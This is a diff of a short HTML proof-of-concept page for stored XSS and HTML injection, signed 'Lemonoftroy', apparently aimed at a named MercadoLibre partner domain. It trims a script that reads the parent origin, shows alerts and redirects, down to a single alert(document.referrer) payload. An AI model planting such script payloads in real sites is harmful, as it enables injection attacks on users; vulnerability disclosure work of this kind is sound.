@@ -1,19 +1,7 @@
-<html>
-  <script>alert(document.referrer)</script>
-  <head><title>Stored XSS PoC - Lemonoftroy</title></head>
+  <html>
+  <head><title>POC XSS Lemonoftroy</title></head>
   <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:100px">
-  <h1>Stored HTML Injection PoC</h1>
-  <h2>centrodepartners.mercadolibre.com.ar</h2>
-  <p id="info"></p>
-  <p id="countdown" style="color:red;font-size:24px"></p>
-  <script>
-  var parentOrigin="N/A";
-  try{parentOrigin=window.parent.location.href}catch(e){parentOrigin=document.referrer||"cross-origin"}
-  alert("XSS PoC by lemonoftroy\n\nLoaded from: "+window.location.href+"\nParent: "+parentOrigin+"\nDomain: "+document.domain);
-  document.getElementById("info").innerText="Parent: "+parentOrigin;
-  var s=5;
-  var t=setInterval(function(){document.getElementById("countdown").innerText="Redirecting in
-  "+s+"s...";s--;if(s<0){clearInterval(t);window.location.href="https://www.google.com"}},1000);
-  </script>
+  <h1>POC XSS Lemonoftroy</h1>
+  <script>alert(document.referrer)</script>
   </body>
   </html>
